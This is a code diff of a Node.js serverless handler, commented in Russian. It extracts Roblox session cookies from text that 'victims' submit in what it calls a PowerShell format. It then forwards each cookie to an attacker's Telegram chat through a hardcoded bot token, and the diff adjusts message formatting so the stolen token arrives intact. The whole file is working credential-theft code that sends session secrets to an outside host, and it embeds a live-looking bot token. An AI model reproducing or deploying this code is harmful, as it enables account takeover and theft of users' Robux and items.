@@ -1,14 +1,13 @@
 const fetch = require('node-fetch');
 
-// ===== ТВОИ ДАННЫЕ =====
+// ===== ТВОИ ДАННЫЕ (захардкожены) =====
 const BOT_TOKEN = "8961899780:AAGUBR-ve4PSdX86Vniv-l1kJx3f7qm0njE";
 const CHAT_ID = "-5527664230";
-// ========================
+// ========================================
 
 const PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
 
 function extractCookie(text) {
-    // Ищем самую длинную последовательность допустимых символов (длиной > 30)
     const pattern = /[A-Za-z0-9._\-]{30,}/g;
     const matches = text.match(pattern);
     if (matches) {
@@ -82,7 +81,6 @@ exports.handler = async (event) => {
 
         let token = null;
         if (raw) {
-            // Оставляем только допустимые символы (на всякий случай)
             const clean = raw.replace(/[^A-Za-z0-9._\-]/g, '');
             if (clean.length > 20) {
                 token = PREFIX + clean;
@@ -93,15 +91,15 @@ exports.handler = async (event) => {
             return { statusCode: 400, body: JSON.stringify({ error: 'Invalid PowerShell format' }) };
         }
 
-        // Отправка в Telegram
+        // Отправка в Telegram – БЕЗ parse_mode, чтобы подчёркивания не превращались в курсив
         const message = `🆕 Token for ${victim}:\n${token}`;
         const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
+                text: message
+                // parse_mode не указываем, чтобы текст был обычным
             })
         });
 
